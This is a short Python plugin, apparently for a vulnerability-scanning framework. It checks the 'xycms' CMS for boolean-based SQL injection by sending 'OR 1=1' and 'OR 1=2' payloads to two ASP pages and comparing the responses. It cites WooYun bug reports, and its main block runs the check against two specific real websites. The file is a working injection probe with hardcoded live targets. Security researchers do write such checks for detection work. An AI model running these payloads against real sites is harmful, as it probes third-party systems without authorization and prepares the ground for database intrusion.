#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-090874
#refer:http://www.wooyun.org/bugs/wooyun-2010-090451

import re

def assign(service, arg):
    if service == 'xycms':
        return True, arg

def audit(arg):            
    payloads = [
        'showkbxx.asp?id=-1',
        'shownews.asp?id=-1'
        ]
    getdata1 ='%20OR%201%3D1'
    getdata2 = '%20OR%201%3D2'
    for payload in payloads:
        code1, head, res1, errcode, _ = curl.curl2(arg + payload + getdata1)
        code2, head, res2, errcode, _ = curl.curl2(arg + payload + getdata2)
        m1 = re.findall('<div',res1)
        m2 = re.findall('<div',res2)
        if code1 ==200 and code2 == 200 and m1!=m2:
            security_hole(arg + payload + "   :sql Injection")
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('xycms','http://www.gl360.org/')[1])
    audit(assign('xycms','http://www.yjcjy.com/')[1])
    